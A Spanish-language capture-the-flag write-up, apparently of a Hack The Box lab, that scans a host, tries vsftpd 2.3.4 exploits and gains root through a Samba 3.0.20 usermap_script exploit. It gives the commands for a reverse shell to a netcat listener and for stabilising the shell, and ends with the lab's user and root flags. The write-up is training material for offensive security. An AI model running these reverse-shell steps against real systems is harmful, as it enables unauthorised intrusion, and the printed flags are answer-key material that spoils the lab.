![[Pasted image 20250703203426.png]]

# Nmap

>Lo primero que haremos será un escaneo de la ip victima con nmap

```bash
 nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.129.199.205 -oN scanner
```

![[Pasted image 20250703203613.png]]

>Identificamos los puertos 21, 22, 139, 445, 3632

>Ahora vamos a hacer un escáner con scripts básicos de nmap para obtener informacion del servicio y la versión que hay detras de esos puertos

```bash
nmap -p21,22,139,445,3632 -sCV 10.129.199.205 -oN targeted
```

![[Pasted image 20250703203831.png]]

>Lo primero que me llama la atención es que en el puerto 21 FTP tenemos acceso como anonymous así que tratamos de acceder y recolectar informacion

# FTP

```bash
ftp 10.129.199.205
```

anonymous:anonymous

![[Pasted image 20250703204251.png]]

>Como habíamos visto tenemos acceso al puerto 21 como anonymous pero realmente no podemos hacer gran cosa por lo que probamos por otro lado

## Servicio vsftpd 2.3.4

>Buscamos vulnerabilidades conocidas sobre el servicio

![[Pasted image 20250703204529.png]]

>En exploitDB vemos que tenemos 2 exploits para atacar esta vulnerabilidad, en la que podemos realizar una "backdoor command Execution"

### Metasploit

>abrimos Metasploit

```bash
msfdb run
```

>usamos search para buscar el exploit que vimos en exploitDB

```bash
search vsftpd 2.3.4
```

![[Pasted image 20250703204755.png]]

vemos que si existe el exploit por lo que lo seleccionamos y vemos que opciones tiene

```bash
use 0
```
```bash
options
```


![[Pasted image 20250703205002.png]]

>Nos indica que es requisito indicar la Ip victima (RHOSTS) y el puerto que vamos a atacar 21 (RPORT)

```bash
set RHOSTS 10.129.199.205
```

el puerto ya viene por defecto así que no modificamos nada y lanzamos el exploit

```bash
exploit
```

![[Pasted image 20250703205246.png]]

podemos ver que no ha conseguido crear una sesion con la que podamos ejecutar comandos


### Terminal 

>vimos en ExploitDB que a parte del exploit en meta teníamos otro exploit que se puede ejecutar desde la terminal

Nos Descargamos el exploit  y le damos permisos de ejecucion

```bash
chmod +x 49757.py 
```

>Una vez le hemos otorgado los permisos de ejecución procedemos a lanzar el ataque

```bash
python3 49757.py 10.129.199.205
```

![[Pasted image 20250703213812.png]]

>Aparece este error todo el rato, he tratado de instalar telnetlib3 pero sigue sin funcionar

# Samba

Buscamos exploits en exploitDB que utilicen el servicio Samba 3.0.20

![[Pasted image 20250703214242.png]]

>Al igual que antes aparecen 2 exploits uno va dirigido a metasploit y otro por terminal. aunque el de terminal es Remote Heap Overflow y no me convence tanto 

## Metasploit

![[Pasted image 20250703214420.png]]

Utilizamos el modulo indicado con un "0"

![[Pasted image 20250703214651.png]]

modificamos los parámetros indicados 
- RHOSTS = IP victima
- RPORT = Puerto victima
- LHOST = ip Atacante
- LPORT = puerto de escucha atacante

>Una vez lo tenemos todo configurado nos ponemos en escucha por el puerto 4444

```bash 
nc -nlvp 4444
```
![[Pasted image 20250703214855.png]]

y lanzamos el ataque

![[Pasted image 20250703214916.png]]

>Podemos observar que no ha tenido éxito 

> trate de probar también el puerto victima 445 en el que corre el mismo servicio y la respuesta fue la misma 


## Terminal

>Buscamos en internet informacion de la vulnerabilidad y posibles repositorios de github donde tengan un exploit que nos pueda servir

en mi caso encontré este https://github.com/h3x0v3rl0rd/CVE-2007-2447.git

>Nos clonamos el repositorio

```bash
git clone https://github.com/h3x0v3rl0rd/CVE-2007-2447.git
```

>Accedemos al directorio creado al clonar y damos permisos de ejecucion al .py

```bash
chmod +x smb3.0.20.py
```

>El repositorio tiene un README.md asi que lo miramos y vemos que indica 

- instalar: pip3 install pysmb
- ponerse en escucha : nc -nlvp 4444
- uso de herramienta : python3 smb3.0.20.py -lh 10.10.16.18 -lp 4444 -t 10.10.10.3

pues vamos a ello en la terminal ponemos 

```bash
pip3 install pysmb
```

después nos ponemos en escucha por el puerto deseado en mi caso el 443

```bash
nc -nlvp 443
```

una vez tenemos esto listo utilizamos la herramienta con python3

```bash
python3 smb3.0.20.py -lh 10.10.14.155 -lp 443 -t 10.129.199.205
```

>Revisamos el puerto en escucha y vemos esto

![[Pasted image 20250703215711.png]]

Tenemos una terminal con usuario Root. por lo que la intrusión del exploit ha sido un éxito.

# Tratamos la Shell

>Revisamos si tiene python instalado

```bash
which python
```

>/usr/bin/python

>Después utilizamos el comando:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

>Suspendemos la shell con ctrl + Z

y en la terminal usamos 
```bash
stty raw -echo; fg
```

```bash
export TERM=xterm
```

```bash
export SHELL=bash
```

# Buscamos las banderas

la primera se encuentra en /home/makis/user.txt

![[Pasted image 20250703220257.png]]

Y la del usuario root se encuentra en /root/root.txt
![[Pasted image 20250703220343.png]]

# Banderas

>User makis : c8c2040d203566b5eb14bcc5838590d3

>Root : 098191055eb36defb13c6293b73d056e